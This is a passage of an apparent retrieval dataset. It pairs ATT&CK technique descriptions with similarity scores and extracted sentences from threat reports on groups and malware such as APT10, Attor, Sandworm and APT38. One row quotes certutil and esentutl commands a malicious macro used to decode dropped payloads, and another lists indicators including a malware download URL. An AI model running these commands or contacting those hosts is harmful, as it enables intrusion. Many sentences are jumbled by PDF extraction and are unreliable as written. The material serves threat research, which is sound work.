vad.get_protection(vadinfo.VadInfo.']"
Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect.|0.8186532150813405|"['Adversaries may create multiple stages for command and control Multi-Stage Channels T1104 that are employed under different conditions or for certain functions.', 'Adversaries may interact with the native OS application Native API T1106 programming interface (API) to execute behaviors.', 'Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove Modify Registry T1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution.', 'Once established within a system or network, an adversary may Automated Collection T1119 use automated techniques for collecting internal data.', 'Adversaries may encode data to make the content of command Data Encoding T1132 and control traffic more difficult to detect.', 'Adversaries may encode data with a non-standard data encoding Non-Standard Encoding T1132.002 system to make the content of command and control traffic more difficult to detect.', 'Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to Network Share Discovery T1135 gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.', 'Deobfuscate/Decode Files Adversaries may use Obfuscated Files or Information to hide T1140 or Information artifacts of an intrusion from analysis.', 'Exploit Public-Facing Adversaries may attempt to exploit a weakness in an Internet- T1190 Application facing host or system to initially access a network.', 'Page 45 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may attempt to gather information on domain trust Domain Trust Discovery T1482 relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.', 'Adversaries may establish persistence and elevate privileges by Installer Packages T1546.016 using an installer to trigger the execution of malicious content.']"
Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect.|0.8627955581235252|"['Adversaries may use an OSI non-application layer protocol for Non-Application Layer T1095 communication between host and C2 server or among infected Protocol hosts within a network.', 'Adversaries may create multiple stages for command and control Multi-Stage Channels T1104 that are employed under different conditions or for certain functions.', 'Adversaries may interact with the native OS application Native API T1106 programming interface (API) to execute behaviors.', 'Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove Modify Registry T1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution.', 'Once established within a system or network, an adversary may Automated Collection T1119 use automated techniques for collecting internal data.', 'Adversaries may encode data to make the content of command Data Encoding T1132 and control traffic more difficult to detect.', 'Adversaries may encode data with a non-standard data encoding Non-Standard Encoding T1132.002 system to make the content of command and control traffic more difficult to detect.', 'Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to Network Share Discovery T1135 gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.', 'Deobfuscate/Decode Files Adversaries may use Obfuscated Files or Information to hide T1140 or Information artifacts of an intrusion from analysis.', 'Exploit Public-Facing Adversaries may attempt to exploit a weakness in an Internet- T1190 Application facing host or system to initially access a network.', 'Page 45 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may attempt to gather information on domain trust Domain Trust Discovery T1482 relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.']"
Some versions of UPPERCUT have used the hard-coded string this is the encrypt key for Blowfish encryption when communicating with a C2.|0.870846516962343|"['2/9Figure 2: Macro to display lure document The initial Word documents were password protected, likely in an effort to bypass detection.', 'Once the password (delivered in the body of the email) is entered, the users are presented with a document that will request users to enable the malicious macro, as shown in Figure 3.', 'Figure 3: Lure document Figure 4 shows what happens when the malicious macro is executed.', '3/9Figure 4: Macro to install UPPERCUT The execution workflow is as follows: 1.', 'The macro drops three PEM files, padre1.txt, padre2.txt, and padre3.txt, to the victims %TEMP% folder and then copies them from %TEMP% to the %AllUserProfile% folder.', '2.', 'The macro decodes the dropped files using Windows certutil.exe with the following commands (certutil.exe is a legitimate built-in command-line program to manage certificates in Windows): C:\\\Windows\\\System32\\\cmd.exe"" /c certutil -decode C:\\\ProgramData\\\padre1.txt C:\\\ProgramData\\\GUP.txt C:\\\Windows\\\System32\\\cmd.exe"" /c certutil -decode C:\\\ProgramData\\\padre2.txt C:\\\ProgramData\\\libcurl.txt C:\\\Windows\\\System32\\\cmd.exe"" /c certutil -decode C:\\\ProgramData\\\padre3.txt C:\\\ProgramData\\\3F2E3AB9 3.', 'The macro creates a copy of the files with their proper extensions using Extensible Storage Engine Utilities (esentutil.exe) with the following commands (esentutil.exe is also a legitimate program that is pre-installed in Windows): C:\\\Windows\\\System32\\\esentutl.exe"" /y C:\\\ProgramData\\\GUP.txt /d C:\\\ProgramData\\\GUP.exe /o C:\\\Windows\\\System32\\\esentutl.exe"" /y C:\\\ProgramData\\\libcurl.txt /d C:\\\ProgramData\\\libcurl.dll /o The dropped files include the following: GUP.exe : GUP, a free (LGPL) Generic Updater.', 'GUP is an open source binary used by Notepad++ for software updates.', 'The version used here is version 4.1 digitally signed by Notepad++, as shown in Figure 5. libcurl.dll: Malicious Loader DLL 3F2E3AB9: Encrypted shellcode 4/9Figure 5: Notepad++ signed updater 4.', 'The macro launches the legitimate executable GUP.exe.']"
SodaMaster can check for the presence of the Registry key HKEY_CLASSES_ROOT\\Applications\\VMwareHostOpen.exe before proceeding to its main functionality.|0.840478384504701|"['A description of each command is shown in the following table.', 'Command Description Compilation time of P8RAT 2019-01-07 2019- 06-10 https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/ 13/214/1/2021 APT10: sophisticated multi-layered loader Ecipekac discovered in A41APT campaign | Securelist d Create thread for launching downloaded DLL Enabled Enabled and call export function of the DLL.', 'f Set value as RC4 key for the encrypted C2 Not Enabled communication implemented l Set value as sleep time Not Enabled implemented s Create thread for executing downloaded Enabled Enabled shellcode Based on the analysis of the backdoor features of the SodaMaster module, the purpose of this malware is also to download and execute payloads (DLL or shellcode), like P8RAT.', 'Unfortunately, we have not been able to obtain these payloads yet.', 'The SodaMaster module also shows an anti-VM feature.', 'The malware looks for the presence of the registry key HKEY_CLASSES_ROOT\\\Applications\\\VMwareHostOpen.exe on the victims system before proceeding to its main functionality.', 'This registry key is specific to the VMware environment.', 'SodaMaster anti-VM check Another characteristic of SodaMaster is the use of a common obfuscation technique known as stackstrings to create the registry key in double-byte characters.', 'We observed the same obfuscation technique used for a process name and DLL name in other SodaMaster samples.', 'https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/ 14/214/1/2021 APT10: sophisticated multi-layered loader Ecipekac discovered in A41APT campaign | Securelist FYAnti loader for QuasarRAT The last observed type of payload deployed by Ecipekac is a loader module named FYAnti loader.', 'In the Ecipekac loader malware of the fourth layer, the DLL is loaded into memory and an export carrying the name F**kY**Anti is called.']"
SodaMaster can check for the presence of the Registry key HKEY_CLASSES_ROOT\\Applications\\VMwareHostOpen.exe before proceeding to its main functionality.|0.840478384504701|['Then the malware randomly generates a value as an RC4 key for C2 communication.', 'The first data block sent to the C2 server includes the user_name, the host_name, PID of the malware module, OS_version, socket_name, the generated RC4 key and the malwares elapsed running time.C2 communication of SodaMasterWe confirmed four backdoor commands, coded as d, f, l and s, in the recent SodaMaster sample.', 'In addition, we also discovered an old SodaMaster sample which has only two commands.', 'A description of each command is shown in the following table.CommandDescriptionCompilation time of SodaMaster2019-01-072019-06-10dCreate thread for launching downloaded DLL and call export function of the DLL.EnabledEnabledfSet value as RC4 key for the encrypted C2 communicationNot implementedEnabledlSet value as sleep timeNot implementedEnabledsCreate thread for executing downloaded shellcodeEnabledEnabledBased on the analysis of the backdoor features of the SodaMaster module, the purpose of this malware is also to download and execute payloads (DLL or shellcode), like P8RAT.', 'Unfortunately, we have not been able to obtain these payloads yet.The SodaMaster module also shows an anti-VM feature.', 'The malware looks for the presence of the registry key HKEY_CLASSES_ROOT\\\Applications\\\VMwareHostOpen.exe on the victims system before proceeding to its main functionality.', 'This registry key is specific to the VMware environment.SodaMaster anti-VM checkAnother characteristic of SodaMaster is the use of a common obfuscation technique known as stackstrings to create the registry key in double-byte characters.', 'We observed the same obfuscation technique used for a process name and DLL name in other SodaMaster samples.FYAnti loader for QuasarRATThe last observed type of payload deployed by Ecipekac is a loader module named FYAnti loader.', 'In the Ecipekac loader malware of the fourth layer, the DLL is loaded into memory and an export carrying the name F**kY**Anti is called.', 'We named this loader FYAnti because of this distinct string.', 'The execution flow of the FYAnti has two additional layers to implement the final stage, which is a QuasarRAT (a.k.a xRAT).Infection flow of FYAnti loaderThe first layer of the FYAnti loader decrypts an embedded .NET module and executes it using the CppHostCLR technique.']
Attor monitors the free disk space on the system.|0.834675018908401|['ESET Research white papers TLP: WHITE AT COMMANDS, TOR-BASED COMMUNICATIONS: MEET ATTOR, A FANTASY CREATURE AND ALSO A SPY PLATFORM Author: Zuzana HromcovIn the fantasy book A Court of Thorns and Roses by Sarah J. Maas, Attor was an evil Faerie.', 'In that book, the Faeries ruled over all the known world and humans were their slaves.', 'In cybersecurity, Attor is a cyberespionage platform designed to exfiltrate valuable information from its victims.', 'Author: Zuzana Hromcov October 20191 AT commands, TOR-based communications: Meet Attor, a fantasy creature and also a spy platform TLP: WHITE CONTENTS 1 SUMMARY .', '.', '.', '.', '.', '.', '.']
Attor monitors the free disk space on the system.|0.843877862357844|"['T1497 Virtualiza Attor can detect whether it is executed in some virtualized or emulated en tion/Sand vironments.', 'If detected, it terminates itself immediately.', 'box Evasion https://www.welivesecurity.com/2019/10/10/eset-discovers-attor-spy-platform/ 12/1410/11/2019 ESET discovers Attor, a spy platform with curious GSM fingerprinting | WeLiveSecurity Tactic ID Name Description Cre T1056 Input User credentials can be collected by plugin 0x07 via capturing keystrokes.', 'den Capture tial Ac cess Dis T1083 File and Di Plugin 0x01 enumerates files with specific extensions on all hard disk dri cov rectory ves and stores file information in encrypted log files.', 'ery Discovery T1120 Peripheral Plugin 0x01 collects information about inserted storage devices, modems Device and phone devices.', 'Discovery T1082 System In Attor monitors the free disk space on the system.', 'formation Discovery Col T1123 Audio Plugin 0x03 is capable of recording audio using available input sound lec Capture devices.', 'tion T1119 Automated Attor automatically collects data about the compromised system.', 'Collection T115 Clipboard Plugin 0x07 collects data stored in the Windows clipboard by using the Data OpenClipboard and GetClipboardData APIs.', 'T1074 Data Staged Collected data is staged in a central upload directory prior to exfiltration.', 'T1056 Input Plugin 0x07 captures keystrokes pressed within the window of the process Capture where Attor is injected.']"
Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server.|1.0002|"['[19]EnterpriseT1053.005Scheduled Task/Job:Scheduled TaskMagic Houndhas used scheduled tasks to establish persistence and execution.', '[17][19]EnterpriseT1113Screen CaptureMagic Houndmalware can take a screenshot and upload the file to its C2 server.', '[15]EnterpriseT1505.003Server Software Component:Web ShellMagic Houndhas used multiple web shells to gain execution.', '[17][19]EnterpriseT1218.011System Binary Proxy Execution:Rundll32Magic Houndhas used rundll32.exe to execute MiniDump from comsvcs.dll when dumping LSASS memory.', '[17]EnterpriseT1082System Information DiscoveryMagic Houndmalware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine.', 'Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server.', ""[15][17][19]EnterpriseT1016System Network Configuration DiscoveryMagic Houndmalware gathers the victim's local IP address, MAC address, and external IP address."", '[15][17][19].001Internet Connection DiscoveryMagic Houndhas conducted a network call out to a specific website as part of their initial discovery activity.', '[19].002Wi-Fi DiscoveryMagic Houndhas collected names and passwords of all Wi-Fi networks to which a device has previously connected.', '[7]EnterpriseT1049System Network Connections DiscoveryMagic Houndhas used quser.exe to identify existing RDP connections.', '[17]EnterpriseT1033System Owner/User DiscoveryMagic Houndmalware has obtained the victim username and sent it to the C2 server.']"
It has also accessed network diagram files useful for understanding how a host's network was configured.|1.0002|"['[13]EnterpriseT1195.002Supply Chain Compromise:Compromise Software Supply ChainSandworm Teamhas distributedNotPetyaby compromising the legitimate Ukrainian accounting software M.E.Doc and replacing a legitimate software update with a malicious one.', '[36][25][1]EnterpriseT1218.011System Binary Proxy Execution:Rundll32Sandworm Teamused a backdoor which could execute a supplied DLL using rundll32.exe.', '[22]During the2015 Ukraine Electric Power Attack,Sandworm Teamused a backdoor which could execute a supplied DLL usingrundll32.exe.', ""[14]EnterpriseT1082System Information DiscoverySandworm Teamused a backdoor to enumerate information about the infected system's operating system."", '[22][1]EnterpriseT1049System Network Connections DiscoverySandworm Teamhad gathered user, IP address, and server data related to RDP sessions on a compromised host.', ""It has also accessed network diagram files useful for understanding how a host's network was configured."", '[1][17]EnterpriseT1033System Owner/User DiscoverySandworm Teamhas collected the username from a compromised host.', '[1]EnterpriseT1199Trusted RelationshipSandworm Teamhas used dedicated network connections from one victim organization to gain unauthorized access to a separate organization.', '[1]EnterpriseT1204.001User Execution:Malicious LinkSandworm Teamhas tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.', '[1].002User Execution:Malicious FileSandworm Teamhas tricked unwitting recipients into clicking on spearphishing attachments and enabling malicious macros embedded within files.', '[21][1]During the2015 Ukraine Electric Power Attack,Sandworm Teamleveraged Microsoft Office attachments which contained malicious macros that were automatically executed once the user permitted them.']"
Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system.|0.8026486486017416|"['Hijack Execution Flow T1574 Actors were observed using hijack execution flow.', 'Discovery Technique Title ID Use System Network T1016 Actors used the systeminfo command to look for Configuration Discovery details about the network configurations and settings and determine if the system was a VMware virtual machine.', 'The threat actor used route print to display the entries in the local IP routing table.', 'Page 6 o f 16 | Product ID: AA22-277A TLP:WHITECISA | FBI | NSA TLP:WHITE System Network T1016.001 Actors checked for internet connectivity on Configuration Discovery: compromised systems.', 'This may be performed Internet Connection during automated discovery and can be Discovery accomplished in numerous ways.', 'System Owner/User T1033 Actors attempted to identify the primary user, Discovery currently logged in user, set of users that commonly use a system, or whether a user is actively using the system.', 'System Network T1049 Actors used the netstat command to display TCP Connections Discovery connections, prevent hostname determination of foreign IP addresses, and specify the protocol for TCP.', 'Process Discovery T1057 Actors used the tasklist command to get information about running processes on a system and determine if the system was a VMware virtual machine.', 'The actors used tasklist.exe and find.exe to display a list of applications and services with their PIDs for all tasks running on the computer matching the string powers.', 'System Information T1082 Actors used the ipconfig command to get detailed Discovery information about the operating system and hardware and determine if the system was a VMware virtual machine.', 'File and Directory Discovery T1083 Actors enumerated files and directories or may search in specific locations of a host or network share for certain information within a file system.']"
APT38 has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users.|0.7764841161751659|"['[1]EnterpriseT1518.001Software Discovery:Security Software DiscoveryAPT38has identified security software, configurations, defensive tools, and sensors installed on a compromised system.', '[1]EnterpriseT1218.001System Binary Proxy Execution:Compiled HTML FileAPT38has used CHM files to move concealed payloads.', '[10].011System Binary Proxy Execution:Rundll32APT38has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools.', '[1]EnterpriseT1082System Information DiscoveryAPT38has attempted to get detailed information about a compromised host, including the operating system, version, patches, hotfixes, and service packs.', '[1]EnterpriseT1049System Network Connections DiscoveryAPT38installed a port monitoring tool, MAPMAKER, to print the active TCP connections on the local system.', '[2]EnterpriseT1033System Owner/User DiscoveryAPT38has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users.', '[1]EnterpriseT1569.002System Services:Service ExecutionAPT38has created new services or modified existing ones to run executables, commands, or scripts.', ""[1]EnterpriseT1529System Shutdown/RebootAPT38has used a custom MBR wiper named BOOTWRECK, which will initiate a system reboot after wiping the victim's MBR."", '[2]EnterpriseT1204.002User Execution:Malicious FileAPT38has attempted to lure victims into enabling malicious macros within email attachments.', '[1]']"
Adversaries may abuse system services or daemons to execute commands or programs.|0.8191742899571302|[]
Adversaries can execute malicious content by interacting with or creating services either locally or remotely.|0.8038073360495208|['His IT and security experience ranges from small businesses to Fortune 50 organizations.', 'When not in front of a keyboard, hes often found trudging through the frozen tundra of the Upper Midwest, occasionally on horseback.', 'l 68 T1105: Ingress Tool Transfer2021 Threat Detection Report TECHNIQUE T1569 System Services #9 System Services ranks ninth this year thanks almost entirely to detections OVERALL RANK associated with its Service Execution sub-technique.', '20.3% T1569.002 Service Execution ORGANIZATIONS AFFECTED 19.2% 892 ORGANIZATIONS AFFECTED CONFIRMED THREATS Adversaries use the Windows Service Manager to run commands or 909 install or manipulate services, often with elevated privilege levels.', 'SEE MORE > CONFIRMED THREATS T1569: SYSTEM SERVICES Adversaries may abuse system services or daemons to execute commands or programs.', 'Adversaries can execute malicious content by interacting with or creating services.', 'Many services are set to run at boot, which can aid in achieving persistence (Create or Modify System Process), but adversaries can also abuse services for one- time or temporary execution.', '69 SEUQINHCET-BUS TNELAVERP l 69 T1569: System Services2021 Threat Detection Report TECHNIQUE T1569.002 Service Execution #9 Adversaries use the Windows Service Manager to run commands or install or PARENT TECHNIQUE RANK manipulate services, often with elevated privilege levels.', '19.2% Analysis ORGANIZATIONS AFFECTED Why do adversaries use Service Execution?', '892 All production operating systems have one thing in common: a mechanism to run a program or service continuously.', 'On Windows, such a program is referred to as a service, and in the Unix/Linux world, such a program is often referred to CONFIRMED THREATS as a daemon.']
Many services are set to run at boot, which can aid in achieving persistence , but adversaries can also abuse services for one-time or temporary execution.|0.9257377255320655|['When not in front of a keyboard, hes often found trudging through the frozen tundra of the Upper Midwest, occasionally on horseback.', 'l 68 T1105: Ingress Tool Transfer2021 Threat Detection Report TECHNIQUE T1569 System Services #9 System Services ranks ninth this year thanks almost entirely to detections OVERALL RANK associated with its Service Execution sub-technique.', '20.3% T1569.002 Service Execution ORGANIZATIONS AFFECTED 19.2% 892 ORGANIZATIONS AFFECTED CONFIRMED THREATS Adversaries use the Windows Service Manager to run commands or 909 install or manipulate services, often with elevated privilege levels.', 'SEE MORE > CONFIRMED THREATS T1569: SYSTEM SERVICES Adversaries may abuse system services or daemons to execute commands or programs.', 'Adversaries can execute malicious content by interacting with or creating services.', 'Many services are set to run at boot, which can aid in achieving persistence (Create or Modify System Process), but adversaries can also abuse services for one- time or temporary execution.', '69 SEUQINHCET-BUS TNELAVERP l 69 T1569: System Services2021 Threat Detection Report TECHNIQUE T1569.002 Service Execution #9 Adversaries use the Windows Service Manager to run commands or install or PARENT TECHNIQUE RANK manipulate services, often with elevated privilege levels.', '19.2% Analysis ORGANIZATIONS AFFECTED Why do adversaries use Service Execution?', '892 All production operating systems have one thing in common: a mechanism to run a program or service continuously.', 'On Windows, such a program is referred to as a service, and in the Unix/Linux world, such a program is often referred to CONFIRMED THREATS as a daemon.', 'Regardless of what operating system youre using, being able to install a program so it runs whenever the computer is on has an obvious appeal to adversaries.']
APT29 modified timestamps of backdoors to match legitimate Windows files.|0.9502367434826305|['The timestamps are not set to arbitrary values, but rather copied over from default system files.', 'Considering that there are systems with modified and unmodified timestamps within the same incident, it can be assumed that timestamp modification is optional.', 'It appears that the copy target is selectable as the same malware would have the timestamps of different system files.', 'The team has confirmed that the timestamp modification technique done by the Lazarus group is also being used by other APT groups to hide their malware.', 'APT Group Description APT28 APT28 has performed timestomping on victim files.', 'APT29 modified timestamps of backdoors to match legitimate Windows APT29 files.', 'APT32 has used scheduled task raw XML with a backdated timestamp of June 2, 2016.', 'The group has also set the creation time of the files APT32 dropped by the second stage of the exploit to match the creation time of kernel32.dll.', 'Additionally, APT32 has used a random value to modify the timestamp of the file storing the clientID.', 'Chimera has used a Windows version of the Linux touch command to Chimera modify the date and timestamp on DLLs.', 'Kimsuky has manipulated timestamps for creation or compilation dates to Kimsuky defeat anti-forensics.']
Usually this series of packets consists of attempted connections to a predefined sequence of closed ports Port Knocking, but can involve unusual flags, specific strings, or other unique characteristics.|0.9341887409321861|['Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc.', 'Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a well-established method used by both defenders and adversaries to hide open ports from access.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened.', 'Usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.', 'T1105 Remote File Files may be copied from one system to another to stage adversary Copy tools or other files over the course of an operation.', 'Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP.', 'Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.', 'T1094 Custom Adversaries may communicate using a custom command and Command and control protocol instead of encapsulating commands/data in an Control Protocol existing Standard Application Layer Protocol.']
Adversaries may breach or otherwise leverage organizations who have access to intended victims.|0.8818501244421422|['Accessed May 13, 2020 at: https://attack.mitre.org/techniques/T1193/ TLP: WHITE, ID#202006091030 11TTPs Spearphishing Link 1 Spearphishing with a link is a specific variant of spearphishing.', 'It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments.', 'Spearphishing via Service 2 Spearphishing via service is a specific variant of spearphishing.', 'It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels.', 'Supply Chain Compromise 3 Supply chain compromise is the manipulation of products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.', 'Trusted Relationship 4 Adversaries may breach or otherwise leverage organizations who have access to intended victims.', 'Access through trusted third party relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.', '11 MITRE.', '(October 18, 2019).', 'SpearphishingLink.', 'Accessed May 13, 2020 at: https://attack.mitre.org/techniques/T1192/ 2 MITRE.']
Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.|0.7913883716099877|"['T1547 Privilege Escalation Threat actor configures system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems.', 'T1564 Defense Evasion Threat actor may attempt to hide artifacts associated with their behaviors to evade detection.', 'T1562.001 Defense Evasion Threat actor may disable security tools to avoid possible detection of their tools and activities.', 'Threat actor may use obfuscated files or T1140 Defense Evasion information to hide artifacts of an intrusion.', 'Adversaries may communicate using application layer protocols associated with web traffic to Command and Control T1071.001 avoid detection/network filtering by blending in with existing traffic.', 'Adversaries may communicate using application layer protocols associated with electronic mail T1071.003 Command and Control delivery to avoid detection/network filtering by blending in with existing traffic.', 'Telsy SpA - TLP : WHITE 11 December 03, 2020... T1132 Command and Control Command and control (C2) information is encoded using a standard data encoding system T1056.001 Collection Threat actor may log user keystrokes to intercept credentials as the user types them.', 'T1113 Threat actor may attempt to take screen captures of the desktop to gather information over the Collection course of an operation.', ""T1125 Threat actor can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or Collection applications (e.g., video call services) to capture video recordings for the purpose of gathering information."", 'T1041 Exfiltration Threat actor relies on command and control infrastructure to exfiltrate data Telsy SpA - TLP : WHITE 12 December 03, 2020... About Te lsy is a top provider for advanced cyber defense and operations practices through its internal threat intelligence research division.', 'An elite group of highly skilled professionals works daily on the development of technologies capable of analyzing, correlating and reporting known and emerging threats in order to support the strengthening of national security as well as the business and the growth of its customers.']"
Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.|0.9084054992916557|"['Indicators of Compromise Type Value sha256 d9335a58ec7d9016258640393f0cedf4a574ae6bf9e262772ac0b21be1b3f160 sha256 25b747c5b79774e91f72f07b81819b9d1548d958247b81a72dca223cda2182b0 sha256 168cddae42f300dbf9a398a79ed28f7d18d35791b02f13b14509e4a8c23b5a9b sha256 907040c91f9b0dbe13ce4b1fc5b96774a578625a1b023684ef78d1c16b6e89ce sha256 2fb00f8374b1b111ed9061a709b35c8cbfa8ad60bf27669c5a1a77385af514c1 sha256 ba27b84be509f5707480a79966f02ee8a976baac8e68793a8ce9cf35ed9be0fd sha256 3943281b88b1c4d3afabc6f0db027b3933a0b3dcf22c13bd37103fa33d851d13 sha256 7dd928a1dbfb9e75e2c8832736810e328b2f6e8203dbf19c35edbcebb22a108a sha256 cbccebda97f3a276ac939e5e1502630e4cf981eb9c16dd80dddc3b6517d4d272 sha256 814c32d56b92bf4eca814173f27b46d0b9eb21cc76f356a17af01416f04bf691 sha256 9d0872926896a0efc6f5e2dc9ac2c7c62d1c29837b238daab47515fcc43a8e51 sha256 ab84cfaadbedc68ed1a9bcdd5b43cc1f64ce4a60e14d0a8b7eaada88dc99f896 sha256 fca6883b6508568056870e73b092d979af35f79b0665ff62c078909187c87eee sha256 02e069ca6d3d262d8e663981a1ace8aba1e44c1106e5c1f434b05e80f2eef19b sha256 26345084cbd7f3571599ead41cde209b46e5a9633b4b6d0e4c5ba379d3ffa4b8 sha256 cda07296d20a239bdb9cb5a2c9a814f69811bc85ced8bf32e998b906a413f416 sha256 15170d0dbe467efc4e38156ed4e03702ae19af44c100d7df7a75c6dbdb7ac587 sha256 2d31a07b636024d8dbf8fc1533c7af7ee9720886995c001ba9a701f3a90f007c sha256 7f7041f099dec8c842ac0225e505bbf51d0a4bf6f1440b5ec7b2d10ebd894d05 sha256 36a03ce4571347cee90c03067e2bae39ad80d597c8b40c430b37e4d6be96210e sha256 9e57f7e41d281935cc912f8d7066a6158071b1a79897455ce66cd17c5dd34f95 hostname mail.loanabank.com hostname mail.dledcardetails.pt hostname smtp.opw-global.com Telsy SpA - TLP : WHITE 9 December 03, 2020... hostname mail.bestelectricpanels.com domain cannabispropertybrokers.com domain colchoeslowcost.pt domain poptateseatery.com domain opw-global.com url https://cannabispropertybrokers.com/pop/8OwWKrFQ0gQoKt9.exe email biyou.packing@msa.hinet.net email smtp-2hn19@colchoeslowcost.pt email biyou.packing@msa.hinet.net email smtp-gxlj9@mchepuko.com email hackerteam@c21affiliated.com email wilson_yh@yeah.net email sebastian@amzcomplete.de email info@loanabank.com email wang@hfsr88.com email hugo@beanboom.cn email opwes.insidesales@opw-global.com email sean.barker@opw-global.com email cahya.lesmana@muarainternusa.com email davidloureiro@dledcardetails.pt email comunicaciones@samucongresos.es email administracion@bers.com.mx email info@almoosa-oam.com email dombotenisz@dombotenisz.hu email loureiro@dledcardetails.pt email corporate@hitechpeopleinc.com email careers@ghrc-bk.org email hayley@babygrowmemories.co.uk email info@makbes.com email jdean@itcmanagementsolutions.com email sales@globalelektrindo.com email marketing@nscmhmedicalcentre.com email fbwqv@aba-online.org.ar email info@fisicalmente.it email info@makbes.com Telsy SpA - TLP : WHITE 10 December 03, 2020... email anonymousfox-qxyb5@milanmandiri.com email info@berolahraga.com MITRE ATT&CK Technique Tactic Description T1566 Initial Access Threat actor uses phishing email with a malicious attachment to gain access to the internal network T1204 Execution Threat actor relies upon specific actions by a user in order to gain execution T1547 Persistence Threat actor configures system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems.', 'T1547 Privilege Escalation Threat actor configures system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems.', 'T1564 Defense Evasion Threat actor may attempt to hide artifacts associated with their behaviors to evade detection.', 'T1562.001 Defense Evasion Threat actor may disable security tools to avoid possible detection of their tools and activities.', 'Threat actor may use obfuscated files or T1140 Defense Evasion information to hide artifacts of an intrusion.', 'Adversaries may communicate using application layer protocols associated with web traffic to Command and Control T1071.001 avoid detection/network filtering by blending in with existing traffic.', 'Adversaries may communicate using application layer protocols associated with electronic mail T1071.003 Command and Control delivery to avoid detection/network filtering by blending in with existing traffic.', 'Telsy SpA - TLP : WHITE 11 December 03, 2020... T1132 Command and Control Command and control (C2) information is encoded using a standard data encoding system T1056.001 Collection Threat actor may log user keystrokes to intercept credentials as the user types them.', 'T1113 Threat actor may attempt to take screen captures of the desktop to gather information over the Collection course of an operation.', ""T1125 Threat actor can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or Collection applications (e.g., video call services) to capture video recordings for the purpose of gathering information."", 'T1041 Exfiltration Threat actor relies on command and control infrastructure to exfiltrate data Telsy SpA - TLP : WHITE 12 December 03, 2020... About Te lsy is a top provider for advanced cyber defense and operations practices through its internal threat intelligence research division.']"
Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.|0.7682852438178881|"['Adversaries may inject dynamic-link libraries (DLLs) into Dynamic-link Library T1055.001 processes in order to evade process-based defenses as well as Injection possibly elevate privileges.', 'Adversaries may log user keystrokes to intercept credentials as Keylogging T1056.001 the user types them.', 'Adversaries may abuse PowerShell commands and scripts for PowerShell T1059.001 execution.', 'Adversaries may communicate using OSI application layer Application Layer Protocol T1071 protocols to avoid detection/network filtering by blending in with existing traffic.', 'Adversaries may communicate using application layer protocols Web Protocols T1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic.', 'Adversaries may communicate using application layer protocols Mail Protocols T1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.', 'Adversaries may communicate using the Domain Name System DNS T1071.004 (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic.', 'Page 44 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may stage collected data in a central location or Data Staged T1074 directory prior to Exfiltration.', 'Adversaries may obtain and abuse credentials of existing Valid Accounts T1078 accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.', 'Adversaries may enumerate files and directories or may search in File and Directory T1083 specific locations of a host or network share for certain Discovery information within a file system.', 'To disguise the source of malicious traffic, adversaries may chain Multi-hop Proxy T1090.003 together multiple proxies.']"
